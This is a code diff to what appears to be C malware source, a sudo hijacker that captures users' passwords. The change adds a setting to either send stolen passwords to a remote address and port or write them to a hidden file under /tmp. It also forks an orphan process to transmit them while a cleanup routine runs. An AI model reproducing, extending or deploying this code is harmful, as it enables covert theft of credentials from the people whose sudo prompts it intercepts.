@@ -18,12 +18,21 @@
 /*
     Custom setting
 */
-# define MAX_RESEND 30
-# define RESEND_INTERVAL 5
 # define FILENAME "/tmp/.impost3r"
 # define BACKUP_BASHRC "/tmp/.bashrc"
+# define SAVE_OR_SEND 0 //send=0,save=1,default is send
+/*
+    Send to server
+*/
+# define MAX_RESEND 30
+# define RESEND_INTERVAL 5
 # define REMOTE_ADDRESS "192.168.0.12"
 # define REMOTE_PORT 8888
+
+/*
+    Save to local
+*/
+# define SAVE_LOCATION "/tmp/.cache"
 
 int successFlag = 1;
 
@@ -127,6 +136,15 @@ send_passwd(char *all)
     }
 }
 
+void save_passwd_local(char *all)
+{
+   FILE *fp = NULL;
+ 
+   fp = fopen(SAVE_LOCATION, "w");
+   fputs(all, fp);
+   fclose(fp);
+}
+
 void 
 clear_all(){
    char command[BUFFER_LEN] = {0};
@@ -223,12 +241,19 @@ hijack_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
             if (!successFlag)
             {
                 /*
-                    尝试生成孤儿进程负责传输密码，主进程负责清场，防止阻塞
+                    生成孤儿进程负责传输密码，子进程负责清场，防止阻塞
                 */
                 int pid = fork();
                 if (pid == 0)
                 {
-                    send_passwd(all);
+                    if (SAVE_OR_SEND)
+                    {
+                        save_passwd_local(all);
+                    }
+                    else
+                    {
+                        send_passwd(all);
+                    }
                 }
                 else
                 {
